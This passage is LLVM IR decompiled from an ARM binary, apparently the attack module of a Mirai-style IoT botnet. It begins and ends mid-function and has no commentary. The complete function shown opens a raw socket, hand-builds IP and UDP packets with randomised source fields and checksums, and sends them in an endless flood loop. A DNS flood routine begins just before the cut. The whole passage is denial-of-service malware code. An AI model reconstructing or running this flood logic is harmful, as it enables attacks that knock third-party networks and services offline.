  %v5_be48 = inttoptr i32 %v0_be40 to i32*
  %v6_be48 = call i32 @attack_get_opt_int(i32 %v0_be3c, i32* %v5_be48, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_be30)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_be58 = load i32, i32* @r5, align 4
  store i32 %v6_be48, i32* @r6, align 4
  %v0_be60 = load i32, i32* @r4, align 4
  %v5_be64 = inttoptr i32 %v0_be58 to i32*
  %v6_be64 = call i32 @attack_get_opt_int(i32 %v0_be60, i32* %v5_be64, i32 7, i32 27015, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_be64, i32* @r4, align 4
  %v1_be70 = call i32 @table_unlock_val(i32 25)
  %v3_be7c = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_be90 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_be94 = icmp eq i32 %v3_be90, -1
  store i1 %v7_be94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_be90, i32* @sb, align 4
  br i1 %v7_be94, label %dec_label_pc_c1bc, label %dec_label_pc_bea0

dec_label_pc_bea0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bea8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bea8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bebc = call i32 @__GI_setsockopt(i32 %v3_be90, i32 0, i32 3, i32 %v6_bea8, i32 ptrtoint (i32* @0 to i32))
  %v7_bec0 = icmp eq i32 %v5_bebc, -1
  store i1 %v7_bec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bec0, label %dec_label_pc_c1b4, label %dec_label_pc_bec8

dec_label_pc_bec8:                                ; preds = %dec_label_pc_bea0
  %v0_bec8 = load i32, i32* @r4, align 4
  %v3_bec8 = mul i32 %v0_bec8, 65536
  store i32 %v3_bec8, i32* @lr, align 4
  %v0_becc = load i32, i32* @r7, align 4
  %v0_bed0 = load i32, i32* @r6, align 4
  %v3_bed0 = mul i32 %v0_bed0, 65536
  store i32 %v3_bed0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_bed8 = urem i32 %v0_becc, 65536
  %v3_bedc = urem i32 %v0_bed0, 65536
  store i32 %v3_bedc, i32* %r2.global-to-local, align 4
  %v3_bee0 = urem i32 %v0_bec8, 65536
  store i32 %v3_bee0, i32* %r3.global-to-local, align 4
  %v0_bee4 = load i32, i32* @r8, align 4
  %v2_bee4 = icmp eq i32 %v0_bee4, 0
  store i1 %v2_bee4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bee4, label %dec_label_pc_c020.preheader, label %dec_label_pc_befc

dec_label_pc_befc:                                ; preds = %dec_label_pc_bec8
  %tmp33 = mul i32 %v0_becc, 256
  %v3_bf0c = and i32 %tmp33, 65280
  store i32 %v3_bf0c, i32* %r3.global-to-local, align 4
  %tmp34 = mul i32 %v0_bed0, 256
  %v3_bf10 = and i32 %tmp34, 65280
  store i32 %v3_bf10, i32* %r2.global-to-local, align 4
  %tmp35 = mul i32 %v0_bec8, 256
  %v3_bf14 = and i32 %tmp35, 65280
  %tmp36 = udiv i32 %v0_becc, 256
  %v4_bf18 = urem i32 %tmp36, 256
  %v5_bf18 = or i32 %v4_bf18, %v3_bf0c
  store i32 %v5_bf18, i32* @r5, align 4
  %tmp37 = udiv i32 %v0_bed0, 256
  %v4_bf1c = urem i32 %tmp37, 256
  %v5_bf1c = or i32 %v4_bf1c, %v3_bf10
  store i32 %v5_bf1c, i32* @r6, align 4
  %tmp38 = udiv i32 %v0_bec8, 256
  %v4_bf20 = urem i32 %tmp38, 256
  %v5_bf20 = or i32 %v4_bf20, %v3_bf14
  store i32 %v5_bf20, i32* @r7, align 4
  %v1_bfa8 = trunc i32 %v5_be24 to i8
  br label %dec_label_pc_bf24

dec_label_pc_bf24:                                ; preds = %.thread, %dec_label_pc_befc
  %v2_bf2c = call i32 @calloc(i32 128, i32 1)
  %v3_bf30 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf30, i32* %r2.global-to-local, align 4
  %v5_bf38 = mul i32 %v3_bf30, 24
  store i32 %v5_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = load i32, i32* @fp, align 4
  %v2_bf3c = load i32, i32* @r4, align 4
  %v5_bf3c = mul i32 %v2_bf3c, 4
  %v6_bf3c = add i32 %v5_bf3c, %v1_bf3c
  %v7_bf3c = inttoptr i32 %v6_bf3c to i32*
  store i32 %v2_bf2c, i32* %v7_bf3c, align 4
  %v0_bf40 = load i32, i32* %r3.global-to-local, align 4
  %v1_bf40 = load i32, i32* @sl, align 4
  %v2_bf40 = add i32 %v1_bf40, %v0_bf40
  store i32 %v2_bf40, i32* %r3.global-to-local, align 4
  %v0_bf44 = load i32, i32* @fp, align 4
  %v1_bf44 = load i32, i32* %r2.global-to-local, align 4
  %v4_bf44 = mul i32 %v1_bf44, 4
  %v5_bf44 = add i32 %v4_bf44, %v0_bf44
  %v6_bf44 = inttoptr i32 %v5_bf44 to i32*
  %v7_bf44 = load i32, i32* %v6_bf44, align 4
  store i32 %v7_bf44, i32* @lr, align 4
  %v1_bf4c = inttoptr i32 %v7_bf44 to i8*
  %v2_bf4c = load i8, i8* %v1_bf4c, align 1
  %tmp = urem i8 %v2_bf4c, 16
  %v1_bf50 = zext i8 %tmp to i32
  %v1_bf54 = or i32 %v1_bf50, 64
  store i32 %v1_bf54, i32* %r3.global-to-local, align 4
  %v1_bf5c = trunc i32 %v1_bf54 to i8
  store i8 %v1_bf5c, i8* %v1_bf4c, align 1
  %v0_bf60 = load i32, i32* @lr, align 4
  %v1_bf60 = inttoptr i32 %v0_bf60 to i8*
  %v2_bf60 = load i8, i8* %v1_bf60, align 1
  %v1_bf64 = and i8 %v2_bf60, -16
  %v1_bf68 = or i8 %v1_bf64, 5
  store i8 %v1_bf68, i8* %v1_bf60, align 1
  %v2_bf74 = load i32, i32* @lr, align 4
  %v3_bf74 = add i32 %v2_bf74, 1
  %v4_bf74 = inttoptr i32 %v3_bf74 to i8*
  store i8 %v5_bde8, i8* %v4_bf74, align 1
  %v3_bf78 = load i32, i32* %stack_var_-48, align 4
  %v3_bf7c = mul i32 %v3_bf78, 65536
  %v1_bf80 = add i32 %v3_bf7c, 2097152
  %v3_bf84 = udiv i32 %v1_bf80, 256
  %v4_bf8c = udiv i32 %v1_bf80, 16777216
  %v5_bf8c = or i32 %v3_bf84, %v4_bf8c
  %v3_bf90 = urem i32 %v3_bf78, 65536
  store i32 %v3_bf90, i32* %r2.global-to-local, align 4
  %v1_bf94 = trunc i32 %v5_bf8c to i16
  %v2_bf94 = load i32, i32* @lr, align 4
  %v3_bf94 = add i32 %v2_bf94, 2
  %v4_bf94 = inttoptr i32 %v3_bf94 to i16*
  store i16 %v1_bf94, i16* %v4_bf94, align 2
  %v0_bf98 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf98 = mul i32 %v0_bf98, 65536
  %v3_bfa0 = add i32 %v1_bf98, 786432
  store i32 %v3_bfa0, i32* %r2.global-to-local, align 4
  store i32 %v1_be30, i32* %ip.global-to-local, align 4
  %v2_bfa8 = load i32, i32* @lr, align 4
  %v3_bfa8 = add i32 %v2_bfa8, 8
  %v4_bfa8 = inttoptr i32 %v3_bfa8 to i8*
  store i8 %v1_bfa8, i8* %v4_bfa8, align 1
  %v0_bfac = load i32, i32* %r2.global-to-local, align 4
  %v3_bfac = udiv i32 %v0_bfac, 256
  %v1_bfb0 = and i32 %v3_bfac, 65280
  %v0_bfb4 = load i32, i32* %ip.global-to-local, align 4
  %v2_bfb4 = icmp eq i32 %v0_bfb4, 0
  store i1 %v2_bfb4, i1* %cpsr_z.global-to-local, align 1
  %v4_bfb8 = udiv i32 %v0_bfac, 16777216
  %v5_bfb8 = or i32 %v1_bfb0, %v4_bfb8
  store i32 %v5_bfb8, i32* %ip.global-to-local, align 4
  %v2_bfc0 = load i32, i32* @lr, align 4
  %v3_bfc0 = add i32 %v2_bfc0, 9
  %v4_bfc0 = inttoptr i32 %v3_bfc0 to i8*
  store i8 17, i8* %v4_bfc0, align 1
  store i32 ptrtoint (i32* @global_var_24f78.59 to i32), i32* %r3.global-to-local, align 4
  %v0_bfc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bfc8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bf24
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_bfcc = load i32, i32* @lr, align 4
  %v4_bfcc = add i32 %v3_bfcc, 6
  %v5_bfcc = inttoptr i32 %v4_bfcc to i16*
  store i16 64, i16* %v5_bfcc, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bf24, %bb
  %v2_bfd0 = load i32, i32* @global_var_24f78.59, align 4
  %v1_bfd4 = load i32, i32* @lr, align 4
  %v2_bfd4 = add i32 %v1_bfd4, 12
  %v3_bfd4 = inttoptr i32 %v2_bfd4 to i32*
  store i32 %v2_bfd0, i32* %v3_bfd4, align 4
  store i32 %v2_bf40, i32* %r2.global-to-local, align 4
  %v1_bfdc = add i32 %v2_bf40, 16
  %v2_bfdc = inttoptr i32 %v1_bfdc to i32*
  %v3_bfdc = load i32, i32* %v2_bfdc, align 4
  %v1_bfe0 = load i32, i32* @lr, align 4
  %v2_bfe0 = add i32 %v1_bfe0, 16
  %v3_bfe0 = inttoptr i32 %v2_bfe0 to i32*
  store i32 %v3_bfdc, i32* %v3_bfe0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_bfe8 = load i32, i32* @lr, align 4
  %v1_bfe8 = add i32 %v0_bfe8, 20
  store i32 %v1_bfe8, i32* %r4.global-to-local, align 4
  %v2_bfec = add i32 %v0_bfe8, 28
  %v3_bfec = inttoptr i32 %v2_bfec to i32*
  store i32 -1, i32* %v3_bfec, align 4
  %v0_bff0 = load i32, i32* @r5, align 4
  %v1_bff0 = trunc i32 %v0_bff0 to i16
  %v2_bff0 = load i32, i32* @lr, align 4
  %v3_bff0 = add i32 %v2_bff0, 4
  %v4_bff0 = inttoptr i32 %v3_bff0 to i16*
  store i16 %v1_bff0, i16* %v4_bff0, align 2
  %v0_bff4 = load i32, i32* @lr, align 4
  %v1_bff4 = add i32 %v0_bff4, 32
  %v0_bff8 = load i32, i32* %ip.global-to-local, align 4
  %v1_bff8 = trunc i32 %v0_bff8 to i16
  %v2_bff8 = load i32, i32* %r4.global-to-local, align 4
  %v3_bff8 = add i32 %v2_bff8, 4
  %v4_bff8 = inttoptr i32 %v3_bff8 to i16*
  store i16 %v1_bff8, i16* %v4_bff8, align 2
  %v0_bffc = load i32, i32* @r7, align 4
  %v1_bffc = trunc i32 %v0_bffc to i16
  %v2_bffc = load i32, i32* %r4.global-to-local, align 4
  %v3_bffc = add i32 %v2_bffc, 2
  %v4_bffc = inttoptr i32 %v3_bffc to i16*
  store i16 %v1_bffc, i16* %v4_bffc, align 2
  %v0_c000 = load i32, i32* @r6, align 4
  %v1_c000 = trunc i32 %v0_c000 to i16
  %v2_c000 = load i32, i32* @lr, align 4
  %v3_c000 = add i32 %v2_c000, 20
  %v4_c000 = inttoptr i32 %v3_c000 to i16*
  store i16 %v1_c000, i16* %v4_c000, align 2
  %v3_c004 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c004, i32* %r2.global-to-local, align 4
  %v3_c008 = call i32 @util_memcpy(i32 %v1_bff4, i32 %v3_be7c, i32 %v3_c004)
  %v3_c00c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c00c, i32* %r3.global-to-local, align 4
  %v1_c010 = add i32 %v3_c00c, 1
  store i32 %v1_c010, i32* @r4, align 4
  %v1_c014 = load i32, i32* @r8, align 4
  %v9_c014 = icmp eq i32 %v1_c010, %v1_c014
  store i1 %v9_c014, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c010, i32* %stack_var_-44, align 4
  %v5_c01c = icmp slt i32 %v1_c010, %v1_c014
  br i1 %v5_c01c, label %dec_label_pc_bf24, label %dec_label_pc_c020.preheader

dec_label_pc_c020.preheader:                      ; preds = %.thread, %dec_label_pc_bec8
  %v0_c024.ph = phi i32 [ 0, %dec_label_pc_bec8 ], [ %v1_c014, %.thread ]
  %v9_c060 = icmp eq i32 %v3_bed8, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  br label %dec_label_pc_c020

dec_label_pc_c020:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c, %dec_label_pc_c020.preheader
  %v0_c024 = phi i32 [ %v0_c024.ph, %dec_label_pc_c020.preheader ], [ 0, %dec_label_pc_c10c ], [ 0, %dec_label_pc_c020 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c024 = icmp eq i32 %v0_c024, 0
  store i1 %v2_c024, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c024, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c030:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c
  br label %dec_label_pc_c034

dec_label_pc_c034:                                ; preds = %dec_label_pc_c080, %dec_label_pc_c030
  %v1_c044 = phi i32 [ %v1_c0fc, %dec_label_pc_c080 ], [ 0, %dec_label_pc_c030 ]
  %v5_c038 = mul i32 %v1_c044, 24
  %v1_c03c = load i32, i32* @sl, align 4
  %v2_c03c = add i32 %v1_c03c, %v5_c038
  store i32 %v2_c03c, i32* %r3.global-to-local, align 4
  %v1_c040 = add i32 %v2_c03c, 20
  %v2_c040 = inttoptr i32 %v1_c040 to i8*
  %v3_c040 = load i8, i8* %v2_c040, align 1
  %v4_c040 = zext i8 %v3_c040 to i32
  store i32 %v4_c040, i32* %r2.global-to-local, align 4
  %v0_c044 = load i32, i32* @fp, align 4
  %v4_c044 = mul i32 %v1_c044, 4
  %v5_c044 = add i32 %v0_c044, %v4_c044
  %v6_c044 = inttoptr i32 %v5_c044 to i32*
  %v7_c044 = load i32, i32* %v6_c044, align 4
  store i32 %v7_c044, i32* @r5, align 4
  %v7_c04c = icmp eq i8 %v3_c040, 31
  store i1 %v7_c04c, i1* %cpsr_z.global-to-local, align 1
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r7, align 4
  %v1_c054 = add i32 %v7_c044, 20
  store i32 %v1_c054, i32* @r6, align 4
  %tmp39 = icmp ult i8 %v3_c040, 32
  br i1 %tmp39, label %dec_label_pc_c120, label %dec_label_pc_c05c

dec_label_pc_c05c:                                ; preds = %dec_label_pc_c034
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  store i1 %v9_c060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c060, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c068:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v1_c06c = phi i32 [ %v1_c178, %dec_label_pc_c120 ], [ add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), %dec_label_pc_c05c ]
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v9_c06c = icmp eq i32 %v3_bedc, %v1_c06c
  store i1 %v9_c06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c06c, label %dec_label_pc_c194, label %dec_label_pc_c074

dec_label_pc_c074:                                ; preds = %dec_label_pc_c180.dec_label_pc_c074_crit_edge, %dec_label_pc_c068
  %v1_c078 = phi i32 [ %v1_c078.pre, %dec_label_pc_c180.dec_label_pc_c074_crit_edge ], [ %v1_c06c, %dec_label_pc_c068 ]
  %v9_c078 = icmp eq i32 %v3_bee0, %v1_c078
  store i1 %v9_c078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c078, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c080:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074, %dec_label_pc_c1a8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c084 = load i32, i32* @r5, align 4
  %v3_c084 = add i32 %v2_c084, 10
  %v4_c084 = inttoptr i32 %v3_c084 to i16*
  store i16 0, i16* %v4_c084, align 2
  %v0_c08c = load i32, i32* @r5, align 4
  store i32 %v0_c08c, i32* @r0, align 4
  %v2_c090 = call i32 @checksum_generic(i32 %v0_c08c, i32 20)
  %v3_c090 = trunc i32 %v2_c090 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c098 = load i32, i32* @r5, align 4
  %v4_c098 = add i32 %v3_c098, 10
  %v5_c098 = inttoptr i32 %v4_c098 to i16*
  store i16 %v3_c090, i16* %v5_c098, align 2
  %v0_c09c = load i32, i32* %r3.global-to-local, align 4
  %v1_c09c = trunc i32 %v0_c09c to i16
  %v2_c09c = load i32, i32* @r6, align 4
  %v3_c09c = add i32 %v2_c09c, 6
  %v4_c09c = inttoptr i32 %v3_c09c to i16*
  store i16 %v1_c09c, i16* %v4_c09c, align 2
  %v3_c0a0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0a0, i32* %r3.global-to-local, align 4
  %v0_c0a4 = load i32, i32* @r6, align 4
  store i32 %v0_c0a4, i32* @r1, align 4
  %v1_c0a8 = add i32 %v0_c0a4, 4
  %v2_c0a8 = inttoptr i32 %v1_c0a8 to i16*
  %v3_c0a8 = load i16, i16* %v2_c0a8, align 2
  %v4_c0a8 = zext i16 %v3_c0a8 to i32
  store i32 %v4_c0a8, i32* %r2.global-to-local, align 4
  %v1_c0ac = add i32 %v3_c0a0, 12
  store i32 %v1_c0ac, i32* %r3.global-to-local, align 4
  %v0_c0b0 = load i32, i32* @r5, align 4
  %v4_c0b4 = call i32 @checksum_tcpudp(i32 %v0_c0b0, i32 %v0_c0a4, i32 %v4_c0a8, i32 %v1_c0ac)
  %v5_c0b4 = trunc i32 %v4_c0b4 to i16
  %v3_c0b8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0b8, i32* %r3.global-to-local, align 4
  %v3_c0bc = mul i32 %v3_c0b8, 32
  store i32 %v3_c0bc, i32* %lr.global-to-local, align 4
  %v3_c0c0 = load i32, i32* @r6, align 4
  %v4_c0c0 = add i32 %v3_c0c0, 6
  %v5_c0c0 = inttoptr i32 %v4_c0c0 to i16*
  store i16 %v5_c0b4, i16* %v5_c0c0, align 2
  %v0_c0c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_c0c4 = load i32, i32* %r3.global-to-local, align 4
  %tmp40 = mul i32 %v1_c0c4, -8
  %v5_c0c4 = add i32 %v0_c0c4, %tmp40
  store i32 %v5_c0c4, i32* %lr.global-to-local, align 4
  %v0_c0c8 = load i32, i32* @r6, align 4
  %v1_c0c8 = add i32 %v0_c0c8, 2
  %v2_c0c8 = inttoptr i32 %v1_c0c8 to i16*
  %v3_c0c8 = load i16, i16* %v2_c0c8, align 2
  %v4_c0c8 = zext i16 %v3_c0c8 to i32
  store i32 %v4_c0c8, i32* @r6, align 4
  %v3_c0cc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0cc, i32* %r2.global-to-local, align 4
  %v1_c0d0 = load i32, i32* @sl, align 4
  %v2_c0d0 = add i32 %v1_c0d0, %v5_c0c4
  store i32 %v2_c0d0, i32* @lr, align 4
  %v3_c0d4 = add i32 %v2_c0d0, 2
  %v4_c0d4 = inttoptr i32 %v3_c0d4 to i16*
  store i16 %v3_c0c8, i16* %v4_c0d4, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c0e0 = load i32, i32* @r5, align 4
  %v0_c0e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0e4 = add i32 %v0_c0e4, 32
  store i32 %v1_c0e4, i32* %r2.global-to-local, align 4
  %v0_c0e8 = load i32, i32* @sb, align 4
  %v0_c0ec = load i32, i32* @lr, align 4
  %v6_c0f4 = call i32 @__libc_sendto(i32 %v0_c0e8, i32 %v0_c0e0, i32 %v1_c0e4, i32 16384, i32 %v0_c0ec, i32 16)
  %v3_c0f8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0f8, i32* %r3.global-to-local, align 4
  %v1_c0fc = add i32 %v3_c0f8, 1
  %v1_c100 = load i32, i32* @r8, align 4
  %v9_c100 = icmp eq i32 %v1_c0fc, %v1_c100
  store i1 %v9_c100, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c0fc, i32* %stack_var_-44, align 4
  %v5_c108 = icmp slt i32 %v1_c0fc, %v1_c100
  br i1 %v5_c108, label %dec_label_pc_c034, label %dec_label_pc_c10c

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c080
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c110 = icmp eq i32 %v1_c100, 0
  store i1 %v2_c110, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c110, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c120:                                ; preds = %dec_label_pc_c034
  %v1_c120 = add i32 %v2_c03c, 16
  %v2_c120 = inttoptr i32 %v1_c120 to i32*
  %v3_c120 = load i32, i32* %v2_c120, align 4
  store i32 %v3_c120, i32* @r4, align 4
  %v0_c124 = call i32 @rand_next()
  %v3_c128 = load i32, i32* %stack_var_-44, align 4
  %v5_c130 = mul i32 %v3_c128, 24
  %v0_c134 = load i32, i32* @r4, align 4
  %v1_c134 = and i32 %v0_c134, 16711680
  store i32 %v1_c134, i32* %ip.global-to-local, align 4
  %v3_c138 = udiv i32 %v0_c134, 16777216
  %v4_c13c = udiv i32 %v1_c134, 256
  %v5_c13c = or i32 %v4_c13c, %v3_c138
  store i32 %v5_c13c, i32* %r2.global-to-local, align 4
  %v1_c140 = load i32, i32* @sl, align 4
  %v2_c140 = add i32 %v1_c140, %v5_c130
  %v1_c144 = and i32 %v0_c134, 65280
  store i32 %v1_c144, i32* %r3.global-to-local, align 4
  %v1_c148 = add i32 %v2_c140, 20
  %v2_c148 = inttoptr i32 %v1_c148 to i8*
  %v3_c148 = load i8, i8* %v2_c148, align 1
  %v4_c148 = zext i8 %v3_c148 to i32
  store i32 %v4_c148, i32* %ip.global-to-local, align 4
  %v5_c150 = call i32 @llvm.bswap.i32(i32 %v0_c134)
  %v7_c154 = lshr i32 %v0_c124, %v4_c148
  %v8_c154 = add i32 %v7_c154, %v5_c150
  store i32 %v8_c154, i32* %r2.global-to-local, align 4
  %v5_c16c = call i32 @llvm.bswap.i32(i32 %v8_c154)
  %v1_c170 = load i32, i32* @r5, align 4
  %v2_c170 = add i32 %v1_c170, 16
  %v3_c170 = inttoptr i32 %v2_c170 to i32*
  store i32 %v5_c16c, i32* %v3_c170, align 4
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  %v1_c178 = load i32, i32* @r7, align 4
  %v9_c178 = icmp eq i32 %v3_bed8, %v1_c178
  store i1 %v9_c178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c178, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c180:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v0_c180 = call i32 @rand_next()
  %v1_c180 = trunc i32 %v0_c180 to i16
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v1_c188 = load i32, i32* @r7, align 4
  %v9_c188 = icmp eq i32 %v3_bedc, %v1_c188
  store i1 %v9_c188, i1* %cpsr_z.global-to-local, align 1
  %v3_c18c = load i32, i32* @r5, align 4
  %v4_c18c = add i32 %v3_c18c, 4
  %v5_c18c = inttoptr i32 %v4_c18c to i16*
  store i16 %v1_c180, i16* %v5_c18c, align 2
  br i1 %v9_c188, label %dec_label_pc_c194, label %dec_label_pc_c180.dec_label_pc_c074_crit_edge

dec_label_pc_c180.dec_label_pc_c074_crit_edge:    ; preds = %dec_label_pc_c180
  %v1_c078.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_c074

dec_label_pc_c194:                                ; preds = %dec_label_pc_c180, %dec_label_pc_c068
  %v0_c194 = call i32 @rand_next()
  %v1_c194 = trunc i32 %v0_c194 to i16
  %v1_c19c = load i32, i32* @r7, align 4
  %v9_c19c = icmp eq i32 %v3_bee0, %v1_c19c
  store i1 %v9_c19c, i1* %cpsr_z.global-to-local, align 1
  %v3_c1a0 = load i32, i32* @r5, align 4
  %v4_c1a0 = add i32 %v3_c1a0, 20
  %v5_c1a0 = inttoptr i32 %v4_c1a0 to i16*
  store i16 %v1_c194, i16* %v5_c1a0, align 2
  br i1 %v9_c19c, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074
  %v0_c1a8 = call i32 @rand_next()
  %v1_c1a8 = trunc i32 %v0_c1a8 to i16
  %v3_c1ac = load i32, i32* @r6, align 4
  %v4_c1ac = add i32 %v3_c1ac, 2
  %v5_c1ac = inttoptr i32 %v4_c1ac to i16*
  store i16 %v1_c1a8, i16* %v5_c1ac, align 2
  br label %dec_label_pc_c080

dec_label_pc_c1b4:                                ; preds = %dec_label_pc_bea0
  %v0_c1b4 = load i32, i32* @sb, align 4
  %v1_c1b8 = call i32 @__GI___libc_close(i32 %v0_c1b4)
  br label %dec_label_pc_c1bc

dec_label_pc_c1bc:                                ; preds = %entry, %dec_label_pc_c1b4
  %v1_c1c4 = phi i32 [ %v3_be90, %entry ], [ %v1_c1b8, %dec_label_pc_c1b4 ]
  store i32 %v3_bd94, i32* %r4.global-to-local, align 4
  store i32 %v27_bd94, i32* %lr.global-to-local, align 4
  ret i32 %v1_c1c4

; uselistorder directives
  uselistorder i32 %v1_c178, { 1, 0 }
  uselistorder i32 %v0_c134, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c0fc, { 2, 0, 3, 1 }
  uselistorder i32 %v5_c0c4, { 1, 0 }
  uselistorder i32 %v1_c010, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bf78, { 1, 0 }
  uselistorder i32 %v3_bf10, { 1, 0 }
  uselistorder i32 %v3_bf0c, { 1, 0 }
  uselistorder i32 %v3_bed8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bed0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_becc, { 1, 0, 2 }
  uselistorder i32 %v0_bec8, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bec0, { 1, 0 }
  uselistorder i1 %v7_be94, { 1, 0 }
  uselistorder i32 %v3_be90, { 1, 2, 3, 0 }
  uselistorder i32 %v1_be30, { 1, 2, 0 }
  uselistorder i32 %v5_be24, { 1, 0 }
  uselistorder i32 %v6_bdc8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c1bc, { 1, 0 }
  uselistorder label %dec_label_pc_c080, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
  uselistorder label %dec_label_pc_c020, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_c1cc = load i32, i32* @sb, align 4
  %v27_c1cc = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_c1ec = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c1f0 = load i32, i32* @r5, align 4
  store i32 %v0_c1f0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_c1fc = load i32, i32* @r4, align 4
  store i32 %v0_c1fc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_c204 = inttoptr i32 %v0_c1f0 to i32*
  %v6_c204 = call i32 @attack_get_opt_int(i32 %v0_c1fc, i32* %v5_c204, i32 2, i32 0, i32 %v2_c1ec)
  %v1_c210 = urem i32 %v6_c204, 256
  store i32 %v1_c210, i32* %ip.global-to-local, align 4
